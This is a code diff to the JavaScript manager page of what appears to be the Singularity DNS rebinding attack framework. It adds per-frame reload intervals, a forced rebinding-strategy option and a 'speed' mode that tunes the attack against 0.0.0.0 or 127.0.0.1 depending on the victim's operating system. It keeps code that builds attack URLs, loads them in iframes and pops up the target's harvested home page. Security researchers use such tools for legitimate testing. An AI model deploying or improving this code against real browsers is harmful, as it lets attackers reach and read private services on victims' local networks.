@@ -142,10 +142,10 @@ const Configuration = () => {
         setInterval(i) {
             interval = i;
         },
-        getWsProxyPort(){
+        getWsProxyPort() {
             return wsProxyPort;
         },
-        setWsProxyPort(port){
+        setWsProxyPort(port) {
             wsProxyPort = port;
         },
         getRebindingStrategy() {
@@ -190,6 +190,7 @@ const Frame = (id, url) => {
     let fmurl = url;
     let timer = null;
     let errorCount = 0;
+    let interval = null;
     return {
         getId() {
             return fmid;
@@ -205,6 +206,12 @@ const Frame = (id, url) => {
         },
         setTimer(val) {
             return timer = val;
+        },
+        getInterval() {
+            return interval;
+        },
+        setInterval(val) {
+            interval = val;
         },
         getErrorCount() {
             return errorCount;
@@ -230,7 +237,7 @@ const FrameManager = () => {
         let id = Math.random().toString();
         u.setAttribute('href', url);
         u.setAttribute('id', id);
-        const o = u.port ? `${u.protocol}//${u.hostname}:${u.port}`: `${u.protocol}//${u.hostname}`;
+        const o = u.port ? `${u.protocol}//${u.hostname}:${u.port}` : `${u.protocol}//${u.hostname}`;
         u.remove();
         return o;
     };
@@ -280,8 +287,8 @@ function toggle() {
 // Requests Singularity to instantiate a new HTTP server on specified port.
 function requestPort() {
     putData('/servers', {
-            "Port": document.getElementById("targetport").value
-        })
+        "Port": document.getElementById("targetport").value
+    })
         .then(function (data) {
             getHTTPServersConfig().then(function (HTTPServersConfig) {
                 document.getElementById("listenports").textContent = HTTPServersConfig.ports;
@@ -316,9 +323,9 @@ function getHTTPServersConfig() {
 function putData(url, data) {
     // Default options are marked with *
     return fetch(url, {
-            body: JSON.stringify(data),
-            method: 'PUT',
-        })
+        body: JSON.stringify(data),
+        method: 'PUT',
+    })
         .then(response => response.json())
 }
 
@@ -351,12 +358,13 @@ const App = () => {
         document.getElementById('flushdns').checked = configuration.getFlushDns();
     };
 
-    function generateAttackUrl(targetHostIPAddress, targetPort) {
+    function generateAttackUrl(targetHostIPAddress, targetPort, forceDnsRebindingStrategyName) {
         return hosturl
             .replace("%1", configuration.getAttackHostIPAddress())
             .replace("%2", targetHostIPAddress) // replace(/-/g, '--'))
             .replace("%3", Math.floor(Math.random() * 2 ** 32))
-            .replace("%4", configuration.getRebindingStrategy())
+            .replace("%4", forceDnsRebindingStrategyName === null ?
+                configuration.getRebindingStrategy() : forceDnsRebindingStrategyName)
             .replace("%5", configuration.getAttackHostDomain())
             .replace("%6", targetPort)
             .replace("%7", "soopayload.html" + "?rnd=" + Math.random())
@@ -370,15 +378,32 @@ const App = () => {
             return configuration;
         },
 
-        attackTarget(targetHostIPAddress, targetPort) {
+        attackTarget(targetHostIPAddress, targetPort, optimizeForSpeed) {
             let self = this;
-            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, 
-                self.getConfiguration().getAttackPayload()));
+
+            let payload = app.getConfiguration().getRebindingStrategy();
+            let interval = self.getConfiguration().getInterval();
+
+            if (optimizeForSpeed === true) {
+                // let's try some rebinding strategy optimizations 
+                // Rebinding in 3s!
+                if (targetHostIPAddress === "0.0.0.0" && isUnixy() === true) {
+                    payload = 'ma';
+                    interval = "1";
+
+                } else if (targetHostIPAddress === "127.0.0.1" && isUnixy() === false) {
+                    payload = 'ma';
+                    interval = "1";
+                }
+            }
+
+            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, payload));
+            self.getFrameManager().frame(fid).setInterval(interval);
 
             self.addFrameToDOM(self.getFrameManager().frame(fid));
             self.getFrameManager().frame(fid).setTimer(setInterval((() => {
                 self.reloadAttackFrame(self.getFrameManager().frame(fid))
-            }), parseInt(self.getConfiguration().getInterval()) * 1000));
+            }), parseInt(interval) * 1000));
 
         },
         init(rebindingSuccessCb) {
@@ -452,11 +477,11 @@ const App = () => {
                 }, "*");
                 msg.source.postMessage({
                     cmd: "interval",
-                    param: configuration.getInterval()
+                    param: fm.frame(fid).getInterval() ?  fm.frame(fid).getInterval() : configuration.getInterval() 
                 }, "*");
                 msg.source.postMessage({
-                  cmd: "wsproxyport",
-                  param:  configuration.getWsProxyPort() 
+                    cmd: "wsproxyport",
+                    param: configuration.getWsProxyPort()
                 }, "*");
                 msg.source.postMessage({
                     cmd: "indextoken",
@@ -464,7 +489,7 @@ const App = () => {
                 }, "*");
                 msg.source.postMessage({
                     cmd: "flushdns",
-                    param: {hostname: window.location.hostname, flushDns: configuration.getFlushDns()}
+                    param: { hostname: window.location.hostname, flushDns: configuration.getFlushDns() }
                 }, "*");
                 configuration.setFlushDns(false); // so it run only once in autoattack.
                 msg.source.postMessage({
@@ -515,7 +540,7 @@ const App = () => {
 
             const UiAttackWsProxyPort = document.getElementById("wsproxyport").value;
             configuration.setWsProxyPort(UiAttackWsProxyPort);
-            
+
 
             let fid = fm.addFrame(hosturl
                 .replace("%1", document.getElementById("attackhostipaddress").value)
@@ -541,14 +566,18 @@ const App = () => {
     }
 }
 
+function isUnixy() {
+    return !(navigator.platform.includes('Win'));
+}
+
 function rebindingSuccessCb(msg) {
     console.log(`Iframe reports attack successful for ${msg.origin}\n${msg.data.response}`);
     if ((app.getConfiguration().getAlertSuccess() !== "false") &&
         (app.getConfiguration().getType() === "manager") &&
         (document.getElementById("payloads").value !== "Hook and Control")) {
-        alert("Attack Successful from " + document.domain + ".\n" 
-        + "Origin: \n" + msg.origin + ".\n" 
-        + "Target home page contents:\n" + msg.data.response);
+        alert("Attack Successful from " + document.domain + ".\n"
+            + "Origin: \n" + msg.origin + ".\n"
+            + "Target home page contents:\n" + msg.data.response);
     }
 
 }
